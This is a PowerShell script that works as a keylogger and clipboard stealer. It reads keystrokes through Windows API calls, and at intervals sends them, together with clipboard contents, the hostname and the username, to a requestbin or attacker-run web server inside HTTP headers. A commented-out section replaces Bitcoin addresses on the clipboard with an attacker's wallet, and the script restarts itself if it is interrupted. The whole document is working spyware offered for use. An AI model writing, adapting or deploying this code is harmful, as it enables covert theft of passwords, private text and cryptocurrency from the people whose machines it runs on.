$http='http://requestbin.net/r/*******/' #or your webserver with logs
$log=''
$pclip = ""
$hs=hostname
$u=whoami
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    

    try {
        
        while ($true){

           

            Start-Sleep -Milliseconds 40

            
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                
                $state = $API::GetAsyncKeyState($ascii)

                
                if ($state -eq -32767) {
                    $null = [console]::CapsLock

                    
                    $virtualKey = $API::MapVirtualKey($ascii, 3)

                    
                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                    $checkkbstate = $API::GetKeyboardState($kbstate)

                    
                    $mychar = New-Object -TypeName System.Text.StringBuilder

                    
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
                    $cclip = Get-Clipboard 
                    if ($pclip -ne $cclip){
                    $pclip = $cclip
                    IWR $http -Headers @{"clipclop"=$pclip; "hs"=$hs; "u"=$u}
                    }
                    #That part is not very ethical but can still be used for educationnal purposes
                    #if ($pclip -match '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$' ){
                    #Set-Clipboard "BlackHatBitcoinWallet"
                    #IWR $http -Headers @{"replaced"=$pclip}
                    #}
                    if ($success -eq $true) { 
                    $log=$log+$mychar
                    if ($log.length -gt 20) {  
                        IWR $http -Headers @{"yummy"=$log; "hs"=$hs; "u"=$u}                 
                        #IWR($http+$log)
                        $log=''
                        }  
                    }
                }
            }
        }
    } 
     finally {. $PSCommandPath}
